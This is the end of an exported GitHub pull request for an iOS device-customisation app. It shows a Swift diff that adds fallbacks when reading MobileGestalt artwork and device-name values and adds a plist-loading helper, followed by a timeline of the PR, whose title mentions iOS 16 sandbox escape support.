-            guard let originalSubType = ArtworkDict["ArtworkDeviceSubType"] as? Int else { throw "Failed to get ArtworkDeviceSubType!" }
-            mgOriginalSubtype = originalSubType
-
             let currentCacheExtra = mgCurrentDict["CacheExtra"] as? NSMutableDictionary ?? NSMutableDictionary()
             let currentArtworkDict = currentCacheExtra["oPeik/9e8lQWMszEjbPzng"] as? NSMutableDictionary ?? NSMutableDictionary()
+            let originalSubType = ArtworkDict["ArtworkDeviceSubType"] as? Int
+                ?? currentArtworkDict["ArtworkDeviceSubType"] as? Int
+                ?? 0
+            mgOriginalSubtype = originalSubType
             mgSubtype = currentArtworkDict["ArtworkDeviceSubType"] as? Int ?? originalSubType
 
             if let productType = currentCacheExtra["h9jDsbgj7xIVeIQ8S3/X3Q"] as? String, !productType.isEmpty {
@@ -398,7 +399,9 @@ struct GestaltView: View {
                 mgProductType = machineName()
             }
             
-            guard let deviceName = ArtworkDict["ArtworkDeviceProductDescription"] as? String else { throw "Failed to get ArtworkDeviceProductDescription!" }
+            let deviceName = ArtworkDict["ArtworkDeviceProductDescription"] as? String
+                ?? currentArtworkDict["ArtworkDeviceProductDescription"] as? String
+                ?? machineName()
             mgDeviceName = deviceName
             
             if mgDeviceName == "" {
@@ -451,7 +454,7 @@ struct GestaltView: View {
             let mgSavedURL = docsDir.appendingPathComponent("SavedGestalt.plist")
             
             if FileManager.default.fileExists(atPath: mgSavedURL.path) {
-                let restored = try NSMutableDictionary(contentsOf: mgSavedURL, error: ())
+                let restored = try loadMutablePlistDictionary(from: mgSavedURL)
                 _ = try verifyPlist(restored, targetPath: mgCurrentPath)
                 mgCurrentDict = restored
             } else {
@@ -716,7 +719,21 @@ struct GestaltView: View {
 }
 
 #Preview {
-    GestaltView(mgr: laramgr())
+    GestaltView(mgr: laramgr.shared)
+}
+
+func loadMutablePlistDictionary(from url: URL) throws -> NSMutableDictionary {
+    let data = try Data(contentsOf: url)
+    var format = PropertyListSerialization.PropertyListFormat.binary
+    let plist = try PropertyListSerialization.propertyList(
+        from: data,
+        options: [.mutableContainersAndLeaves],
+        format: &format
+    )
+    guard let dict = plist as? NSMutableDictionary else {
+        throw "Property list root is not a dictionary."
+    }
+    return dict
 }
 
 func verifyPlist(_ plist: Any, targetPath: String) throws -> Data {
  ```

  </details>


---

## Timeline (Verbose)

- : 📝 Commit 9bd46c4: Add iOS 16 sandbox escape support
- May 23, 2026: ✏️ @hxhlb renamed: "Add iOS 16 sandbox escape support" → "Add iOS 16 sandbox escape support and arm64e build fixes"
- May 23, 2026: ✏️ @hxhlb renamed: "Add iOS 16 sandbox escape support and arm64e build fixes" → "Add iOS 16.7.2(arm64e) sandbox escape support"
- : 📝 Commit ff4319b: Merge branch 'rooootdev:main' into for-ios16
- : 📝 Commit 81d31e2: Merge branch 'rooootdev:main' into for-ios16
- : 📝 Commit 30522ec: Add iOS 16.7.2 arm64e support
- May 26, 2026: ✏️ @hxhlb renamed: "Add iOS 16.7.2(arm64e) sandbox escape support" → "Add iOS 16.7.2 arm64e support to Lara"
- May 26, 2026: 🟢 @hxhlb marked ready for review
- May 27, 2026: 🟣 @rooootdev merged
- May 27, 2026: 🔴 Closed by @rooootdev


---

*Exported on 10/14/2026, 3:08:28 PM from [https://github.com/rooootdev/lara/pull/264](https://github.com/rooootdev/lara/pull/264)*
